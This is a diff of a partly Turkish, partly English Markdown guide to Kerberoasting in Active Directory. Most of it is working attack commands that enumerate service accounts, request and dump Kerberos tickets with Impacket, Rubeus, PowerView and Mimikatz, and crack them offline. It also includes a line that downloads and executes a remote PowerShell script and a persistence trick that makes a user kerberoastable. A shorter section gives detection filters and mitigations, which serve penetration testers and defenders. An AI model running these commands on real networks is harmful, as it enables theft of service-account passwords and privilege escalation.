@@ -4,7 +4,7 @@
 
 ## Kerberoast
 
-Kerberoasting, **Active Directory (AD)** altında **kullanıcı hesapları** ile çalışan hizmetlere ait **TGS biletlerinin** edinilmesine odaklanır; **bilgisayar hesapları** hariçtir. Bu biletlerin şifrelemesi, **kullanıcı şifrelerinden** kaynaklanan anahtarları kullanır ve bu da **çevrimdışı kimlik bilgisi kırma** olasılığını sağlar. Bir kullanıcı hesabının hizmet olarak kullanıldığı, boş olmayan bir **"ServicePrincipalName"** özelliği ile belirtilir.
+Kerberoasting, **Active Directory (AD)** altında çalışan **kullanıcı hesapları** ile ilgili olan **TGS biletlerinin** edinilmesine odaklanır; **bilgisayar hesapları** hariçtir. Bu biletlerin şifrelemesi, **kullanıcı şifreleri** kaynaklı anahtarlar kullanır ve bu da **çevrimdışı kimlik bilgisi kırma** olasılığını sağlar. Bir hizmetin, boş olmayan bir **"ServicePrincipalName"** özelliği ile gösterildiği belirtilir.
 
 **Kerberoasting** gerçekleştirmek için, **TGS biletleri** talep edebilen bir alan hesabı gereklidir; ancak bu süreç **özel ayrıcalıklar** talep etmez, bu da **geçerli alan kimlik bilgilerine** sahip herkesin erişimine açık olduğu anlamına gelir.
 
@@ -19,132 +19,154 @@ Kerberoasting, **Active Directory (AD)** altında **kullanıcı hesapları** ile
 
 > [!WARNING]
 > **Kerberoasting araçları**, saldırıyı gerçekleştirirken ve TGS-REQ talepleri başlatırken genellikle **`RC4 şifrelemesi`** talep eder. Bunun nedeni, **RC4'ün** [**daha zayıf**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) olması ve Hashcat gibi araçlar kullanılarak çevrimdışı kırılmasının diğer şifreleme algoritmaları olan AES-128 ve AES-256'dan daha kolay olmasıdır.\
-> RC4 (tip 23) hash'leri **`$krb5tgs$23$*`** ile başlarken, AES-256 (tip 18) **`$krb5tgs$18$*`** ile başlar.`
+> RC4 (tip 23) hash'leri **`$krb5tgs$23$*`** ile başlarken, AES-256 (tip 18) **`$krb5tgs$18$*`** ile başlar.\
+> Ayrıca, dikkatli olun çünkü `Rubeus.exe kerberoast` tüm savunmasız hesaplar üzerinden otomatik olarak bilet talep eder ve bu sizi tespit ettirir. Öncelikle ilginç ayrıcalıklara sahip kerberoastable kullanıcıları bulun ve ardından yalnızca onların üzerinde çalıştırın.
+```bash
 
 #### **Linux**
+
 ```bash
 # Metasploit framework
 msf> use auxiliary/gather/get_user_spns
 # Impacket
-GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
+GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Şifre istenecektir
 GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
 # kerberoast: https://github.com/skelsec/kerberoast
-kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
-kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
+kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Kerberoastable kullanıcıları listele
+kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Hash'leri dök
 ```
-Kerberoastable kullanıcıların dökümünü içeren çok özellikli araçlar:
+
+Multi-features tools including a dump of kerberoastable users:
+
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
 ```
+
 #### Windows
 
-- **Kerberoastable kullanıcıları listele**
-```powershell
-# Get Kerberoastable users
-setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
+- **Enumerate Kerberoastable users**
+
+```bash
+# Kerberoastable kullanıcıları al
+setspn.exe -Q */* #Bu yerleşik bir ikili dosyadır. Kullanıcı hesaplarına odaklanın
 Get-NetUser -SPN | select serviceprincipalname #Powerview
 .\Rubeus.exe kerberoast /stats
 ```
-- **Teknik 1: TGS isteyin ve bellekten dökün**
-```powershell
-#Get TGS in memory from a single user
-Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local
 
-#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
+- **Technique 1: Ask for TGS and dump it from memory**
+
+```bash
+#Tek bir kullanıcıdan bellekte TGS alın
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Örnek: MSSQLSvc/mgmt.domain.local
+
+#Tüm kerberoastable hesaplar için TGS'leri al (PC'ler dahil, pek akıllıca değil)
 setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 
-#List kerberos tickets in memory
+#Bellekteki kerberos biletlerini listele
 klist
 
-# Extract them from memory
-Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
+# Bellekten çıkar
+Invoke-Mimikatz -Command '"kerberos::list /export"' #Biletleri mevcut klasöre dışa aktar
 
-# Transform kirbi ticket to john
+# kirbi biletini john'a dönüştür
 python2.7 kirbi2john.py sqldev.kirbi
-# Transform john to hashcat
+# john'u hashcat'e dönüştür
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 ```
-- **Teknik 2: Otomatik araçlar**
+
+- **Technique 2: Automatic tools**
+
 ```bash
-# Powerview: Get Kerberoast hash of a user
-Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
-# Powerview: Get all Kerberoast hashes
+# Powerview: Bir kullanıcının Kerberoast hash'ini al
+Request-SPNTicket -SPN "<SPN>" -Format Hashcat #PowerView Kullanımı Ör: MSSQLSvc/mgmt.domain.local
+# Powerview: Tüm Kerberoast hash'lerini al
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
 
 # Rubeus
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
-.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins
+.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Belirli kullanıcı
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Yönetici al
 
 # Invoke-Kerberoast
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
-> [!WARNING]
-> Bir TGS talep edildiğinde, Windows olayı `4769 - Bir Kerberos hizmet bileti talep edildi` oluşturulur.
 
-### Kırma
+> [!WARNING]
+> When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.
+
+### Cracking
+
 ```bash
-john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
-hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast  
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt  
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Süreklilik
 
-Eğer bir kullanıcı üzerinde **yeterli izinleriniz** varsa, onu **kerberoastable** hale getirebilirsiniz:
+### Persistence
+
+If you have **enough permissions** over a user you can **make it kerberoastable**:
+
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
-Burada **kerberoast** saldırıları için faydalı **araçlar** bulabilirsiniz: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-Eğer Linux'ta bu **hata** ile karşılaşırsanız: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** bu, yerel saatinizle ilgilidir, hostu DC ile senkronize etmeniz gerekir. Birkaç seçenek var:
+You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-- `ntpdate <DC'nin IP'si>` - Ubuntu 16.04 itibarıyla kullanımdan kaldırılmıştır.
-- `rdate -n <DC'nin IP'si>`
+If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:
 
-### Mitigasyon
+- `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
+- `rdate -n <IP of DC>`
 
-Kerberoasting, eğer istismar edilebiliyorsa, yüksek bir gizlilik derecesi ile gerçekleştirilebilir. Bu aktiviteyi tespit etmek için **Security Event ID 4769**'a dikkat edilmelidir; bu, bir Kerberos biletinin talep edildiğini gösterir. Ancak, bu olayın yüksek sıklığı nedeniyle, şüpheli aktiviteleri izole etmek için belirli filtreler uygulanmalıdır:
+### Mitigation
 
-- Hizmet adı **krbtgt** olmamalıdır, çünkü bu normal bir taleptir.
-- **$** ile biten hizmet adları, hizmetler için kullanılan makine hesaplarını dahil etmemek için hariç tutulmalıdır.
-- Makinalardan gelen talepler, **machine@domain** formatındaki hesap adları hariç tutularak filtrelenmelidir.
-- Sadece başarılı bilet talepleri dikkate alınmalıdır; bunlar **'0x0'** hata kodu ile tanımlanır.
-- **En önemlisi**, bilet şifreleme türü **0x17** olmalıdır; bu, genellikle Kerberoasting saldırılarında kullanılır.
+Kerberoasting can be conducted with a high degree of stealthiness if it is exploitable. In order to detect this activity, attention should be paid to **Security Event ID 4769**, which indicates that a Kerberos ticket has been requested. However, due to the high frequency of this event, specific filters must be applied to isolate suspicious activities:
+
+- The service name should not be **krbtgt**, as this is a normal request.
+- Service names ending with **$** should be excluded to avoid including machine accounts used for services.
+- Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
+- Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
+- **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.
+
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
-Kerberoasting riskini azaltmak için:
 
-- **Hizmet Hesabı Parolalarının tahmin edilmesi zor olmasını** sağlayın, **25 karakterden** uzun bir uzunluk önerilmektedir.
-- **Yönetilen Hizmet Hesaplarını** kullanın, bu da **otomatik parola değişiklikleri** ve **devredilmiş Hizmet Prensip Adı (SPN) Yönetimi** gibi avantajlar sunarak bu tür saldırılara karşı güvenliği artırır.
+To mitigate the risk of Kerberoasting:
 
-Bu önlemleri uygulayarak, organizasyonlar Kerberoasting ile ilişkili riski önemli ölçüde azaltabilir.
+- Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
+- Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.
+
+By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.
 
 ## Kerberoast w/o domain account
 
-**Eylül 2022**'de, Charlie Clark adında bir araştırmacı tarafından bir sistemin istismar edilmesi için yeni bir yol ortaya kondu ve bu, [exploit.ph](https://exploit.ph/) platformu aracılığıyla paylaşıldı. Bu yöntem, herhangi bir Active Directory hesabı üzerinde kontrol gerektirmeden **KRB_AS_REQ** isteği aracılığıyla **Hizmet Biletleri (ST)** edinilmesine olanak tanır. Temelde, bir prensip, ön kimlik doğrulama gerektirmeyecek şekilde ayarlandığında—siber güvenlik alanında **AS-REP Roasting saldırısı** olarak bilinen bir senaryoya benzer—bu özellik, istek sürecini manipüle etmek için kullanılabilir. Özellikle, isteğin gövdesindeki **sname** niteliğini değiştirerek, sistemin standart şifreli Bilet Verme Bileti (TGT) yerine bir **ST** vermesi sağlanır.
+In **September 2022**, a new way to exploit a system was brought to light by a researcher named Charlie Clark, shared through his platform [exploit.ph](https://exploit.ph/). This method allows for the acquisition of **Service Tickets (ST)** via a **KRB_AS_REQ** request, which remarkably does not necessitate control over any Active Directory account. Essentially, if a principal is set up in such a way that it doesn't require pre-authentication—a scenario similar to what's known in the cybersecurity realm as an **AS-REP Roasting attack**—this characteristic can be leveraged to manipulate the request process. Specifically, by altering the **sname** attribute within the request's body, the system is deceived into issuing a **ST** rather than the standard encrypted Ticket Granting Ticket (TGT).
 
-Teknik, bu makalede tam olarak açıklanmaktadır: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
+The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
 > [!WARNING]
-> Bu teknikle LDAP'ı sorgulamak için geçerli bir hesabımız olmadığından, bir kullanıcı listesi sağlamalısınız.
+> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.
 
 #### Linux
 
 - [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
+
 ```bash
 GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
 ```
+
 #### Windows
 
-- [GhostPack/Rubeus PR #139'dan](https://github.com/GhostPack/Rubeus/pull/139):
+- [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
+
 ```bash
 Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 ```
-## Referanslar
+
+## References
 
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
